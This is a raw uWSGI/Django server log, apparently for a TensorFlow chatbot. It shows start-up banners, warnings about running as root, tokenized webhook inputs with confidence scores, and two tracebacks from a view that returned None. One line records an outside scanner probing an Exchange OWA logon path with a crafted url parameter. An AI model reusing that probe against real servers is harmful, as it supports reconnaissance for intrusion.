     0    0    0    0    0    0    0    0    0    0    0    0 1909  297
     8    1]]
62.72%   .

[pid: 2770|app: 0|req: 7/7] 66.249.83.205 () {42 vars in 543 bytes} [Sun Oct 25 06:29:18 2020] POST /webhook/ => generated 79 bytes in 46 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['', '']
['', '']
[[9977, 116]]
[[   0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0    0    0    0    0    0    0    0    0    0    0    0    0    0
  9977  116]]
85.63%   .

[pid: 2770|app: 0|req: 8/8] 66.249.83.203 () {42 vars in 541 bytes} [Sun Oct 25 06:29:26 2020] POST /webhook/ => generated 82 bytes in 45 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['', '', '', '']
['', '', '', '']
[[31, 441, 297, 8]]
[[  0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0
    0   0   0   0   0   0   0   0  31 441 297   8]]
94.78%   .

[pid: 2770|app: 0|req: 9/9] 66.249.83.205 () {42 vars in 543 bytes} [Sun Oct 25 06:29:59 2020] POST /webhook/ => generated 79 bytes in 51 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['', '']
['', '']
[[9977, 116]]
[[   0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0    0    0    0    0    0    0    0    0    0    0    0    0    0
  9977  116]]
85.63%   .

[pid: 2770|app: 0|req: 10/10] 66.249.83.205 () {42 vars in 541 bytes} [Sun Oct 25 06:30:06 2020] POST /webhook/ => generated 81 bytes in 48 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['', '', '', '']
['', '', '', '']
[[31, 441, 297, 8]]
[[  0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0
    0   0   0   0   0   0   0   0  31 441 297   8]]
94.78%   .

[pid: 2770|app: 0|req: 11/11] 66.249.83.201 () {42 vars in 543 bytes} [Sun Oct 25 06:30:25 2020] POST /webhook/ => generated 79 bytes in 46 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['', '']
['', '']
[[51, 261]]
[[  0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0
    0   0   0   0   0   0   0   0   0   0  51 261]]
97.87%   .

[pid: 2770|app: 0|req: 12/12] 66.249.83.201 () {42 vars in 541 bytes} [Sun Oct 25 06:30:29 2020] POST /webhook/ => generated 79 bytes in 45 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['', '']
['', '']
[[9977, 116]]
[[   0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0    0    0    0    0    0    0    0    0    0    0    0    0    0
  9977  116]]
85.63%   .

[pid: 2770|app: 0|req: 13/13] 66.249.83.205 () {42 vars in 541 bytes} [Sun Oct 25 06:30:36 2020] POST /webhook/ => generated 81 bytes in 43 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
[pid: 2770|app: 0|req: 14/14] 162.243.128.215 () {36 vars in 408 bytes} [Sun Oct 25 07:50:05 2020] GET / => generated 1263 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 2770|app: 0|req: 15/15] 74.120.14.36 () {30 vars in 323 bytes} [Sun Oct 25 08:14:33 2020] GET / => generated 1263 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 2770|app: 0|req: 16/16] 74.120.14.36 () {36 vars in 454 bytes} [Sun Oct 25 08:14:33 2020] GET / => generated 1263 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
Not Found: /owa/auth/logon.aspx
[pid: 2770|app: 0|req: 17/17] 192.241.239.30 () {36 vars in 502 bytes} [Sun Oct 25 08:24:34 2020] GET /owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f => generated 2381 bytes in 5 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
[pid: 2770|app: 0|req: 18/18] 167.248.133.36 () {30 vars in 325 bytes} [Sun Oct 25 09:51:59 2020] GET / => generated 1263 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 2770|app: 0|req: 19/19] 167.248.133.36 () {36 vars in 456 bytes} [Sun Oct 25 09:52:00 2020] GET / => generated 1263 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Sun Nov  1 07:06:45 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.4.0-1028-aws #29~18.04.1-Ubuntu SMP Tue Oct 6 17:14:23 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Oct  8 2020, 12:12:24)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x55e76d28ccf0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x55e76d28ccf0 pid: 15886 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 15886, cores: 1)
2020-11-01 07:14:25.619408: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-11-01 07:14:25.619447: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.


2020-11-01 07:14:38.286986: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-11-01 07:14:38.287015: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-11-01 07:14:38.287038: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
2020-11-01 07:14:38.287253: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-11-01 07:14:38.329908: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199920000 Hz
2020-11-01 07:14:38.330295: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x55e772181160 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-11-01 07:14:38.330315: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
2020-11-01 07:14:38.761931: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-11-01 07:14:38.763374: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-11-01 07:14:38.764730: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
[pid: 15886|app: 0|req: 1/1] 121.171.33.70 () {52 vars in 912 bytes} [Sun Nov  1 07:14:23 2020] GET / => generated 1263 bytes in 15585 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
Not Found: /favicon.ico
[pid: 15886|app: 0|req: 2/2] 121.171.33.70 () {52 vars in 852 bytes} [Sun Nov  1 07:14:39 2020] GET /favicon.ico => generated 2328 bytes in 6 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
[pid: 15886|app: 0|req: 3/3] 121.171.33.70 () {52 vars in 934 bytes} [Sun Nov  1 07:16:49 2020] GET /chat => generated 0 bytes in 0 msecs (HTTP/1.1 301) 4 headers in 144 bytes (1 switches on core 0)
[pid: 15886|app: 0|req: 4/4] 121.171.33.70 () {52 vars in 936 bytes} [Sun Nov  1 07:16:49 2020] GET /chat/ => generated 1476 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Sun Nov  1 07:40:02 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.4.0-1028-aws #29~18.04.1-Ubuntu SMP Tue Oct 6 17:14:23 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Oct  8 2020, 12:12:24)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x557c46d08cf0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x557c46d08cf0 pid: 16464 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 16464, cores: 1)
2020-11-01 07:40:38.897383: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-11-01 07:40:38.897417: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.


2020-11-01 07:40:47.348812: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-11-01 07:40:47.348843: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-11-01 07:40:47.348862: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
2020-11-01 07:40:47.349076: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-11-01 07:40:47.377918: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199920000 Hz
2020-11-01 07:40:47.378295: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x557c4bbf4ac0 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-11-01 07:40:47.378312: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
2020-11-01 07:40:47.664682: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-11-01 07:40:47.666122: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-11-01 07:40:47.667528: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
[pid: 16464|app: 0|req: 1/1] 121.171.33.70 () {52 vars in 931 bytes} [Sun Nov  1 07:40:38 2020] GET / => generated 1263 bytes in 9541 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 16464|app: 0|req: 2/2] 121.171.33.70 () {52 vars in 934 bytes} [Sun Nov  1 07:48:00 2020] GET /chat => generated 0 bytes in 1 msecs (HTTP/1.1 301) 4 headers in 144 bytes (1 switches on core 0)
[pid: 16464|app: 0|req: 3/3] 121.171.33.70 () {52 vars in 936 bytes} [Sun Nov  1 07:48:00 2020] GET /chat/ => generated 1476 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
['', '']
['', '']
[[4960, 3917]]
[[   0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0    0    0    0    0    0    0    0    0    0    0    0    0    0
  4960 3917]]
2020-11-01 07:48:17.691143: I tensorflow/compiler/mlir/mlir_graph_optimization_pass.cc:118] None of the MLIR optimization passes are enabled (registered 1)
2020-11-01 07:48:18.206638: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-11-01 07:48:18.208082: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-11-01 07:48:18.209778: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
58.80%   .

[pid: 16464|app: 0|req: 4/4] 66.249.83.203 () {42 vars in 541 bytes} [Sun Nov  1 07:48:12 2020] POST /webhook/ => generated 79 bytes in 5826 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['', '']
['', '']
[[4960, 386]]
[[   0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0    0    0    0    0    0    0    0    0    0    0    0    0    0
  4960  386]]
66.86%   .

[pid: 16464|app: 0|req: 5/5] 66.249.83.205 () {42 vars in 541 bytes} [Sun Nov  1 07:53:19 2020] POST /webhook/ => generated 79 bytes in 64 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['', '']
['', '']
[[9977, 116]]
[[   0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0    0    0    0    0    0    0    0    0    0    0    0    0    0
  9977  116]]
85.63%   .

[pid: 16464|app: 0|req: 6/6] 66.249.83.205 () {42 vars in 541 bytes} [Sun Nov  1 07:54:11 2020] POST /webhook/ => generated 81 bytes in 46 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Sun Nov  1 08:12:05 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.4.0-1028-aws #29~18.04.1-Ubuntu SMP Tue Oct 6 17:14:23 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Oct  8 2020, 12:12:24)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x56360a623d00
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x56360a623d00 pid: 16582 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 16582, cores: 1)
2020-11-01 08:12:39.054160: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-11-01 08:12:39.054196: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.


2020-11-01 08:12:47.511955: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-11-01 08:12:47.511989: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-11-01 08:12:47.512005: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
2020-11-01 08:12:47.512216: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-11-01 08:12:47.537890: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199920000 Hz
2020-11-01 08:12:47.538458: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x56360f5192a0 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-11-01 08:12:47.538478: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
2020-11-01 08:12:48.148773: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-11-01 08:12:48.150241: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-11-01 08:12:48.151618: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
[pid: 16582|app: 0|req: 1/1] 121.171.33.70 () {52 vars in 931 bytes} [Sun Nov  1 08:12:38 2020] GET / => generated 1263 bytes in 9980 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 16582|app: 0|req: 2/2] 121.171.33.70 () {52 vars in 936 bytes} [Sun Nov  1 08:14:29 2020] GET /chat/ => generated 1476 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 16582|app: 0|req: 3/3] 128.14.134.134 () {36 vars in 501 bytes} [Sun Nov  1 08:14:35 2020] GET / => generated 1263 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
['']
['']
[[4353]]
[[   0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0 4353]]
2020-11-01 08:14:46.682289: I tensorflow/compiler/mlir/mlir_graph_optimization_pass.cc:118] None of the MLIR optimization passes are enabled (registered 1)
2020-11-01 08:14:46.989897: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-11-01 08:14:46.991434: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-11-01 08:14:46.992864: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
50.05%   .

[pid: 16582|app: 0|req: 4/4] 66.249.83.203 () {42 vars in 541 bytes} [Sun Nov  1 08:14:42 2020] POST /webhook/ => generated 79 bytes in 4500 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['', '']
['', '']
[[297, 8]]
[[  0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0
    0   0   0   0   0   0   0   0   0   0 297   8]]
89.55%   .

[pid: 16582|app: 0|req: 5/5] 66.249.83.201 () {42 vars in 541 bytes} [Sun Nov  1 08:14:51 2020] POST /webhook/ => generated 79 bytes in 1003 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['', '', '', '']
['', '', '']
[[387, 909, 211]]
[[  0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0
    0   0   0   0   0   0   0   0   0 387 909 211]]
82.59%   .

[pid: 16582|app: 0|req: 6/6] 66.249.83.203 () {42 vars in 543 bytes} [Sun Nov  1 08:15:02 2020] POST /webhook/ => generated 79 bytes in 55 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['', '']
['', '']
[[9977, 116]]
[[   0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0    0    0    0    0    0    0    0    0    0    0    0    0    0
  9977  116]]
85.63%   .

Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 126, in _get_response
    "returned None instead." % (callback.__module__, view_name)
ValueError: The view haniumapp.views.webhook didn't return an HttpResponse object. It returned None instead.
[pid: 16582|app: 0|req: 7/7] 66.249.83.205 () {42 vars in 541 bytes} [Sun Nov  1 08:15:07 2020] POST /webhook/ => generated 49746 bytes in 89 msecs (HTTP/1.1 500) 5 headers in 156 bytes (1 switches on core 0)
['', '', '', '', '', '']
['', '', '', '']
[[31, 1, 9, 8]]
[[ 0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0
   0  0 31  1  9  8]]
91.20%   .

[pid: 16582|app: 0|req: 8/8] 66.249.83.203 () {42 vars in 543 bytes} [Sun Nov  1 08:16:33 2020] POST /webhook/ => generated 79 bytes in 61 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['', '']
['', '']
[[51, 261]]
[[  0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0
    0   0   0   0   0   0   0   0   0   0  51 261]]
97.87%   .

[pid: 16582|app: 0|req: 9/9] 66.249.83.203 () {42 vars in 541 bytes} [Sun Nov  1 08:16:59 2020] POST /webhook/ => generated 79 bytes in 52 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['', '']
['', '']
[[9977, 116]]
[[   0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0    0    0    0    0    0    0    0    0    0    0    0    0    0
  9977  116]]
85.63%   .

[pid: 16582|app: 0|req: 10/10] 66.249.83.205 () {42 vars in 541 bytes} [Sun Nov  1 08:17:08 2020] POST /webhook/ => generated 79 bytes in 43 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['', '', '', '', '', '']
['', '', '', '']
[[31, 297, 9, 8]]
[[  0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0
    0   0   0   0   0   0   0   0  31 297   9   8]]
92.53%   .

[pid: 16582|app: 0|req: 11/11] 66.249.83.203 () {42 vars in 543 bytes} [Sun Nov  1 08:17:17 2020] POST /webhook/ => generated 79 bytes in 53 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['', '']
['', '']
[[9977, 116]]
[[   0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0    0    0    0    0    0    0    0    0    0    0    0    0    0
  9977  116]]
85.63%   .

Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 126, in _get_response
    "returned None instead." % (callback.__module__, view_name)
ValueError: The view haniumapp.views.webhook didn't return an HttpResponse object. It returned None instead.
[pid: 16582|app: 0|req: 12/12] 66.249.83.201 () {42 vars in 541 bytes} [Sun Nov  1 08:17:21 2020] POST /webhook/ => generated 49746 bytes in 82 msecs (HTTP/1.1 500) 5 headers in 156 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Sun Nov  1 08:19:22 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.4.0-1028-aws #29~18.04.1-Ubuntu SMP Tue Oct 6 17:14:23 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Oct  8 2020, 12:12:24)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x559432e15d00
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x559432e15d00 pid: 16709 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 16709, cores: 1)
2020-11-01 08:19:27.221448: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-11-01 08:19:27.221483: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.


2020-11-01 08:19:35.584166: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-11-01 08:19:35.584197: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-11-01 08:19:35.584212: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
